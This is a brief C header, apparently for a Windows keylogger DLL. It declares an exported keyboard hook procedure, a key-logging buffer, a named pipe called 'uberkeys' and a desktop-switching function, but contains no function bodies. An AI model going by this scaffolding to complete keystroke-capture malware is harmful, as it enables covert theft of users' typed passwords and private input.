//#ifdef NDEBUG


//#endif

#define EXPORT __declspec(dllexport)
#define BUFSIZE 2048
#define MAX_LOG_KEYS BUFSIZE-800
#define PIPENAME "\\\\.\\pipe\\uberkeys"

#include <windows.h>

#ifdef FRELEASE
#define deb //
#define FORMATERROR "none"
#else
#define deb fdeb
#define FORMATERROR fmterr()
#endif

int mykey(WPARAM wPararam, LPARAM lPararam, int dumpout);
EXPORT LRESULT CALLBACK KeyProc(int code,WPARAM wParam,LPARAM lParam);
int SetUserDesktop( int mode );

char* fmterr(void);
void fdeb(char *msg,...);

